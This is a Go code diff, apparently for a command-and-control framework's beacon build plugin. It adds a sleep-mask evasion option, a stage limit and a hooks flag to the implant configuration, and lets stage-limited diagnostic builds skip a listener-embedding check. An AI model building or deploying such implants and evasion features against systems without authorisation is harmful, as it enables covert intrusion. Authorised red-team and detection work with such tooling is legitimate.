@@ -259,6 +259,9 @@ type GenerateConfig struct {
 	KillDate   string `json:"kill_date"`
 	KillTime   string `json:"kill_time"`
 	Debug      bool   `json:"debug"`
+	SleepMask  bool   `json:"sleep_mask"`
+	Stages     int    `json:"stages"`
+	Hooks      bool   `json:"hooks"`
 }
 
 // sptConfig: the beacon build contract (crates/core/build.rs).
@@ -270,6 +273,9 @@ type sptConfig struct {
 	Watermark   uint32          `json:"watermark"`
 	KillEpoch   int64           `json:"kill_epoch"`
 	Debug       bool            `json:"debug"`
+	SleepMask   bool            `json:"sleep_mask"`
+	Stages      uint32          `json:"stages"`
+	Hooks       bool            `json:"hooks"`
 	Profile     json.RawMessage `json:"profile"`
 }
 
@@ -497,6 +503,16 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		Watermark:   uint32(watermark),
 		KillEpoch:   killEpoch,
 		Debug:       generateConfig.Debug,
+		SleepMask:   generateConfig.SleepMask,
+		// Zero value of the dialog field (normal builds, no stage limit) maps
+		// to the unlimited default; N > 0 = diagnostic freeze after N stages.
+		Stages: func() uint32 {
+			if generateConfig.Stages <= 0 {
+				return 0xFFFFFFFF
+			}
+			return uint32(generateConfig.Stages)
+		}(),
+		Hooks:      generateConfig.Hooks,
 		Profile:     profileJSON,
 	}
 	cfgJSON, err := json.Marshal(cfg)
@@ -539,6 +555,13 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	// transaction vanish while every pipeline gate stayed green). The
 	// only reliable detector is the produced bytes themselves: the blob
 	// must embed every listener parameter it was built against.
+	// A stage-limited build (diagnostic `stages`) freezes before any
+	// listener-consuming code runs: -Oz legally eliminates those paths,
+	// and the dead-blob guard below would rightly refuse it. Diagnostic
+	// builds skip the embed check by design — they never check in.
+	if generateConfig.Stages > 0 {
+		return blob, "bin", nil
+	}
 	if err := verifyBlobEmbedsListener(blob, listener); err != nil {
 		return nil, "", err
 	}
